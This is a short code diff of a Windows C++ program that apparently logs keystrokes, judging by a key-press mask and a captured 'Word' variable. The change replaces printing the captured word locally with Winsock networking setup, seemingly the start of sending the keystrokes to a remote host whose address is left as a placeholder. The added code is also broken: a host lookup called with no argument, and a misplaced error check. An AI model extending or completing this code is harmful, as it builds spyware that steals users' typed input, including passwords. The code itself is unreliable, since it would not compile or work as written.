@@ -4,10 +4,13 @@
 #include <wchar.h>
 #include <winuser.h>
 #include <windef.h>
+#include <WinSock2.h>
+#include <Windows.h>
+#include <ws2tcpip.h>
 #include <map>
 
 #define IsPressed 0x8000
-
+#define PortNumber "http"
 #define cur_thread 0
 
 using namespace std;
@@ -100,7 +103,23 @@ int main() {
 
     Sleep(100);
 
-    cout << Word << endl;
+    WSADATA wsaData;
+    
+    int result = WSAStartup(MAKEWORD(2,2), &wsaData);
+    if (result) {
+        perror("WSAStartup failed: ");
+        return 1;
+    }
+
+    struct addrinfo *info = NULL, hints;
+
+    string HostAdress = gethostbyname(); //I'll change this whenever it becomes necessary
+
+    if (result != 0) {
+        perror("Getaddrinfo failed: ");
+        WSACleanup();
+        return 1;
+}
 
     return 0;
 }
